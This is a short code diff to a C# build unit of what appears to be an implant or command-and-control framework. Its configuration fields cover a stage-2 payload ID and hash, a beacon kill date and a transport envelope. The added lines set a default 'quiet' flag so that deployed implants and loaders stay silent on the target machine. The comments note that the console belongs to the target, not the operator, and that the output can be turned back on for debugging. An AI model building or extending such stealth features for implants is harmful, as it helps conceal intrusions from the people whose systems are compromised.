@@ -289,6 +289,12 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["requestTimeout"] = ((long)@params.Transport.RequestTimeout.TotalSeconds).ToString() + "s",
             ["envelope"] = @params.Transport.Envelope.ToString().ToLowerInvariant(),
             ["verbs"] = verbs,
+            // A deployed artifact narrates nothing: its console belongs to the
+            // target, not to the operator. Quiet is the baked default for every
+            // pipeline build; a debugging run re-enables the narration by
+            // presetting ROD_QUIET=0 in the environment before launch (the bake
+            // only fills the variable when it is unset).
+            ["quiet"] = "true",
         };
         var json = JsonSerializer.Serialize(map);
         return Base64UrlCodec.Encode(Encoding.UTF8.GetBytes(json));
@@ -326,6 +332,10 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["stage2PayloadId"] = @params.Stage2.PayloadId.ToString(),
             ["stage2Sha256"] = @params.Stage2.Sha256,
             ["killDate"] = @params.Beacon.KillDate.ToString("O"),
+            // Same quiet default as the implant profile: a deployed loader
+            // narrates nothing, and ROD_QUIET=0 preset before launch brings
+            // the narration back for a debugging run.
+            ["quiet"] = "true",
         };
         var json = JsonSerializer.Serialize(map);
         return Base64UrlCodec.Encode(Encoding.UTF8.GetBytes(json));
